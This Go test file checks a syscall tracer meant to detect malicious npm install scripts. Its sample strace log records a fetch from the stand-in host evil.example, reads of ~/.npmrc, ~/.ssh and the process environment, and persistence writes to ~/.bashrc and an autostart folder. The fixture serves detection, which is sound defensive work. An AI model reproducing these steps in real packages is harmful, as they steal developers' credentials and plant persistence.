package main

import (
	"slices"
	"strings"
	"testing"
)

const sample = `100 execve("/usr/bin/node", ["node", "/usr/lib/node_modules/npm/bin/npm-cli.js", "rebuild"], 0x7ffd /* 7 vars */) = 0
100 openat(AT_FDCWD, "/home/alex/.npmrc", O_RDONLY|O_CLOEXEC) = 3
100 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 101
101 execve("/bin/sh", ["sh", "-c", "node install.js"], 0x55 /* 7 vars */) = 0
101 clone3({flags=CLONE_VM, exit_signal=SIGCHLD}, 88 <unfinished ...>
101 <... clone3 resumed>) = 102
102 execve("/usr/bin/curl", ["curl", "http://evil.example/x"], 0x55 /* 7 vars */) = -1 ENOENT (No such file or directory)
101 openat(AT_FDCWD, "/home/alex/.npmrc", O_RDONLY) = 4
101 openat(AT_FDCWD, "/home/alex/.ssh", O_RDONLY|O_DIRECTORY) = 5
101 openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 6
101 openat(AT_FDCWD, "/home/alex/.bashrc", O_WRONLY|O_APPEND) = 7
101 openat(AT_FDCWD, "node_modules/x/build.log", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 8
101 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 9
101 rename("/home/alex/projects/api/a", "/home/alex/.config/autostart/a") = 0
101 connect(10, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH (Network is unreachable)
101 connect(11, {sa_family=AF_INET6, sin6_port=htons(80), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::1", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH
101 connect(12, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 0
101 sendto(12, "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04evil\x07example\x00\x00\x01\x00\x01", 29, MSG_NOSIGNAL, NULL, 0) = 29
101 connect(13, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT
`

func TestTracerObservations(t *testing.T) {
	tr := newTracer(traceScope{home: "/home/alex", project: "/home/alex/projects/api", canaries: []string{"/home/alex/.npmrc", "/home/alex/.ssh/id_ed25519"}})
	if err := tr.parse(strings.NewReader(sample)); err != nil {
		t.Fatal(err)
	}
	obs, dropped := tr.observations()
	if dropped {
		t.Fatal("unexpected truncation")
	}
	check := func(name string, got, want []string) {
		t.Helper()
		if !slices.Equal(got, want) {
			t.Errorf("%s: got %q want %q", name, got, want)
		}
	}
	check("processes", obs.Processes, []string{"/usr/bin/node", "/bin/sh", "/usr/bin/curl"})
	check("canary", obs.CanaryTouches, []string{"/home/alex/.npmrc (by sh)", "/home/alex/.ssh (by sh)"})
	check("env", obs.EnvReads, []string{"/proc/self/environ (by sh)"})
	check("writes", obs.WritesOutsideProject, []string{"/home/alex/.bashrc", "/home/alex/.config/autostart/a"})
	check("hosts", obs.Hosts, []string{"93.184.216.34:443", "[2001:db8::1]:80", "dns:evil.example"})
}

func TestUnescape(t *testing.T) {
	if got := unescape(`a\x41\n\"\\\101`); got != "aA\n\"\\A" {
		t.Fatalf("got %q", got)
	}
}

func TestDNSQuestionRejectsNoise(t *testing.T) {
	if dnsQuestion([]byte("GET / HTTP/1.1\r\nHost: x\r\n")) != "" {
		t.Fatal("parsed HTTP as DNS")
	}
}
